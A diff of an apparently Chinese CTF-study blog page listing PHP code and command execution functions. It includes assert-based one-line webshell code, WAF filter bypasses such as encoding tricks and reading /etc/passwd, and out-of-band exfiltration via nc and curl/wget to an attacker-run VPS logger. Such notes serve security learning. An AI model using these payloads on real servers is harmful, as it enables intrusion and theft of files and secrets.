@@ -29,7 +29,8 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 
@@ -294,8 +295,8 @@
                 <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="rce-代码执行函数"><a href="#rce-代码执行函数" class="headerlink" title="rce_代码执行函数"></a>rce_代码执行函数</h2><h3 id="eval-执行php代码"><a href="#eval-执行php代码" class="headerlink" title="eval() 执行php代码"></a>eval() 执行php代码</h3><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
 <p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
 <p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(phpcode)</span><br></pre></td></tr></table></figure>
-
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code>eval(phpcode)
+</code></pre>
 <table>
 <thead>
 <tr>
@@ -310,28 +311,45 @@
 </tbody></table>
 <h3 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a><strong><code>$&#123;&#125;</code>执行代码</strong></h3><p>同eval()函数，常用于eval被过滤时</p>
 <h3 id="assert-检查一个断言是否为-false"><a href="#assert-检查一个断言是否为-false" class="headerlink" title="assert()  检查一个断言是否为 false"></a>assert()  检查一个断言是否为 <strong><code>false</code></strong></h3><p>语法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(条件); <span class="comment">#如果条件为错，终止程序执行，可以用于执行命令</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#如果条件为错，终止程序执行，可以用于执行命令</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>相当于：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(假设成立)</span><br><span class="line">&#123;</span><br><span class="line">     程序正常运行；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      报错<span class="operator">&amp;&amp;</span>终止程序！（避免由程序运行引起更大的错误）  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>假设成立<span class="token punctuation">)</span>
+{
+     程序正常运行；
+}
+<span class="token keyword">else</span>
+{
+      报错<span class="token operator">&amp;&amp;</span>终止程序！（避免由程序运行引起更大的错误）  
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>普通调用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//?a=phpinfo()</span>
+<span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>assert函数支持动态调用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?a=phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//?a=phpinfo()</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。</strong></p>
 <h3 id="preg-replace-正则匹配替换"><a href="#preg-replace-正则匹配替换" class="headerlink" title="preg_replace() 正则匹配替换"></a>preg_replace() 正则匹配替换</h3><p>语法：preg_replace(正则语句,字符串，要替换的字符串)</p>
 <p>/e参数  : 将字符串当作php代码执行</p>
 <p>执行代码需要使用/e修饰符。如果不使用/e修饰符，代码则不会执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = preg_replace(<span class="string">&quot;/abc/e&quot;</span>,<span class="variable">$b</span>,<span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/abc/e"</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><strong>/e在php7已弃用</strong></p>
 <h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>语法：create_function(变量部分，方法代码)</p>
 <p>如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo 123&quot;</span>);</span><br><span class="line"><span class="comment">#类似于：</span></span><br><span class="line">fuction ft(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span><span class="token string">"echo 123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment">#类似于：</span>
+fuction <span class="token function">ft</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>php7.3 以弃用</strong></p>
 <h2 id="rce-命令执行函数"><a href="#rce-命令执行函数" class="headerlink" title="rce_命令执行函数"></a>rce_命令执行函数</h2><h3 id="system-执行外部程序，并且显示输出"><a href="#system-执行外部程序，并且显示输出" class="headerlink" title="system()   执行外部程序，并且显示输出"></a>system()   执行外部程序，并且显示输出</h3><p>语法：system(‘命令行命令’)；</p>
 <h3 id="passthru-执行外部命令"><a href="#passthru-执行外部命令" class="headerlink" title="passthru() 执行外部命令"></a>passthru() 执行外部命令</h3><p><strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数。</p>
@@ -356,48 +374,73 @@
 <h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>同exec()函数用法和特性一致</p>
 <h3 id="ob-start-打开缓冲区"><a href="#ob-start-打开缓冲区" class="headerlink" title="ob_start() 打开缓冲区"></a><strong>ob_start() 打开缓冲区</strong></h3><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。</p>
 <p>使用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ob_start(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="comment">#当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    ob_end_flush();<span class="comment">#刷新缓冲区的内容，输出。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出www-data</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment">#当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。</span>
+    <span class="token keyword">echo</span> <span class="token string">"whoami"</span><span class="token punctuation">;</span>
+    <span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#刷新缓冲区的内容，输出。</span>
+<span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//输出www-data</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>内部缓冲区的内容可以用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-get-contents.php">ob_get_contents()</a> 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> 函数。另外， 使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-end-clean.php">ob_end_clean()</a> 函数会静默丢弃掉缓冲区的内容。</p>
 <p>语法：</p>
 <p>ob_start(output_callback)</p>
 <p>ob_start()中可选择一个output_callback函数传入，并将中间内容传入此函数，在ob_end_flush()时输出</p>
 <p>对命令的执行效果同exec()</p>
 <h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>在bash下，可以用以下字符代替空格</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure>
-
-
-
+<pre class="line-numbers language-shell"><code class="language-shell"><
+${IFS}
+$IFS$9
+%09
+{cat,flag}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="敏感字符绕过"><a href="#敏感字符绕过" class="headerlink" title="敏感字符绕过"></a>敏感字符绕过</h3><ul>
 <li><p>利用变量绕过</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;$a=l;$b=s;$a$b;</span><br><span class="line">&gt;a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">$a=l;$b=s;$a$b;
+a=l;b=s;$a$b
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>执行ls</p>
 </blockquote>
 </li>
 <li><p>利用反斜杠绕过</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at 1.t\xt</span><br></pre></td></tr></table></figure></blockquote>
+<pre class="line-numbers language-linux"><code class="language-linux">c\at 1.t\xt
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
 </li>
 <li><p>利用引号绕过</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&#x27;&#x27;at /f&#x27;&#x27;lag</span><br><span class="line">c&quot;a&quot;t /&quot;f&quot;lag</span><br></pre></td></tr></table></figure></blockquote>
+<pre class="line-numbers language-linux"><code class="language-linux">c''at /f''lag
+c"a"t /"f"lag
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</blockquote>
 </li>
 <li><p>包裹拼接联合</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=l;$a&#x27;s&#x27;</span><br><span class="line">a=l;$a&#x27;&#x27;s</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">a=l;$a's'
+a=l;$a''s
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="image-20210530091233295.png" alt="image-20210530091233295"></p>
 </blockquote>
 </li>
 <li><p>base64编码绕过</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;echo &#x27;cat&#x27; | base64</span><br><span class="line">&gt;Y2F0Cg==</span><br><span class="line">&gt;`echo &#x27;Y2F0Cg==&#x27; | base64 -d` 1.txt</span><br><span class="line">&gt;-d 代表decode,解码</span><br></pre></td></tr></table></figure></blockquote>
+<pre class="line-numbers language-linux"><code class="language-linux">echo 'cat' | base64
+Y2F0Cg==
+`echo 'Y2F0Cg==' | base64 -d` 1.txt
+-d 代表decode,解码
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
 </li>
 <li><p>16进制编码绕过</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ls&quot;|xxd</span><br><span class="line">6c73 0a</span><br><span class="line">`echo &quot;6c73&quot; | xxd -r -p`</span><br><span class="line">echo &quot;6c73&quot;|xxd -r -p |bash</span><br></pre></td></tr></table></figure></blockquote>
+<pre class="line-numbers language-linux"><code class="language-linux">echo "ls"|xxd
+6c73 0a
+`echo "6c73" | xxd -r -p`
+echo "6c73"|xxd -r -p |bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
 </li>
 <li><p>八进制绕过</p>
 </li>
@@ -407,11 +450,11 @@
 </li>
 <li><p>过滤文件名绕过（例如过滤/etc/passwd文件）</p>
 <p>  利用正则匹配绕过</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /???/pass*</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">cat /???/pass*
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  例如过滤/etc/passwd中的etc，利用未初始化变量，使用$u绕过</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc$u/passwd</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">cat /etc$u/passwd
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>  备注：此方法能绕CloudFlare WAF（出自：<a target="_blank" rel="noopener" href="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/%EF%BC%89">https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/）</a></p>
 </li>
 <li><p>过滤目录分隔符</p>
@@ -445,8 +488,8 @@
 <h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><ul>
 <li><p>命令联合</p>
 <blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `ls` 等同于 cat 1.txt;cat 1.php ...</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">cat `ls` 等同于 cat 1.txt;cat 1.php ...
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210530091727625.png" alt="image-20210530091727625"></p>
 </blockquote>
 <blockquote>
@@ -457,7 +500,10 @@
 <blockquote>
 <p>sh命令可读取文件中的命令执行</p>
 <p>\ 可用作命名换行符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch &#x27;t *;\&#x27;</span><br><span class="line">ls -t&gt; &#x27;ca\&#x27;</span><br><span class="line">sh ca\\</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-linux"><code class="language-linux">touch 't *;\'
+ls -t> 'ca\'
+sh ca\\
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <p>  <img src="image-20210530104005829.png" alt="image-20210530104005829"></p>
 </li>
@@ -468,42 +514,68 @@
 <p><img src="image-20210529202135353.png" alt="image-20210529202135353"></p>
 <h4 id="利用自己的服务器发送文件"><a href="#利用自己的服务器发送文件" class="headerlink" title="利用自己的服务器发送文件"></a>利用自己的服务器发送文件</h4><blockquote>
 <p>先在存在命令执行的服务器上开启端口监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 端口号 </span><br><span class="line">可以发送给一个文件</span><br><span class="line">nc -lnvp 端口号 &gt; 123.txt</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">nc -lnvp 端口号 
+可以发送给一个文件
+nc -lnvp 端口号 > 123.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>然后开启自己的服务器，访问被我们监听的端口，得到数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -vz -w2 ip地址 被监听的端口号 </span><br><span class="line">写入文件</span><br><span class="line">nc -v -w2 ip地址 被监听的端口号 &lt; 123.txt</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">nc -vz -w2 ip地址 被监听的端口号 
+写入文件
+nc -v -w2 ip地址 被监听的端口号 < 123.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>若存在命令执行，我们可以直接通过nc命令将木马发给服务器</p>
 </blockquote>
 <h4 id="利用服务器进行监听"><a href="#利用服务器进行监听" class="headerlink" title="利用服务器进行监听"></a>利用服务器进行监听</h4><blockquote>
 <p>在自己服务器上开始端口监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 端口号</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">nc -lv 端口号
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>在存在命令执行漏洞的服务器中访问服务器端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 服务器ip/`命令`</span><br><span class="line">例如：</span><br><span class="line">curl http://ip:8001/`ls | base64`</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-linux"><code class="language-linux">curl 服务器ip/`命令`
+例如：
+curl http://ip:8001/`ls | base64`
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <p><img src="image-20210529215018111-1622296218513.png" alt="image-20210529215018111"></p>
 <h4 id="在vps上建立记录脚本"><a href="#在vps上建立记录脚本" class="headerlink" title="在vps上建立记录脚本"></a>在vps上建立记录脚本</h4><p>在自己的公网服务器站点根目录写入php文件，内容如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$f</span> = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$f</span>,<span class="variable">$data</span>);</span><br><span class="line">fclose(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//*.*.*.**/record.php?data=`cat flag.php|base64`</span></span><br><span class="line">wget http:<span class="comment">//*.*.*.*/record.php?data=`cat flag.php|base64`</span></span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php">curl http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//*.*.*.**/record.php?data=`cat flag.php|base64`</span>
+wget http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//*.*.*.*/record.php?data=`cat flag.php|base64`</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="通过http请求-dns请求等方式带出数据"><a href="#通过http请求-dns请求等方式带出数据" class="headerlink" title="通过http请求/dns请求等方式带出数据"></a>通过http请求/dns请求等方式带出数据</h4><p>利用doslog：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `命令`.域名</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span>命令<span class="token variable">`</span></span>.域名
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="linux-tee命令"><a href="#linux-tee命令" class="headerlink" title="linux tee命令"></a>linux tee命令</h4><p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法:</span><br><span class="line">tee file1 file2 //复制文件</span><br><span class="line">ls /|tee 1.txt //命令输出</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">用法:
+<span class="token function">tee</span> file1 file2 //复制文件
+<span class="token function">ls</span> /<span class="token operator">|</span><span class="token function">tee</span> 1.txt //命令输出
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="dev-null-2-gt-amp-1类无回显"><a href="#dev-null-2-gt-amp-1类无回显" class="headerlink" title="/dev/null 2&gt;&amp;1类无回显"></a>/dev/null 2&gt;&amp;1类无回显</h4><p>例题：ctfshow-web入门42</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>&gt;/dev/null 2&gt;&amp;1主要意思是不进行回显的意思</code><br>进行命令分隔即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">;</span>    //分号
+<span class="token operator">|</span>    //只执行后面那条命令
+<span class="token operator">||</span>    //只执行前面那条命令
+<span class="token operator">&amp;</span>    //两条命令都会执行
+<span class="token operator">&amp;&amp;</span>    //两条命令都会执行
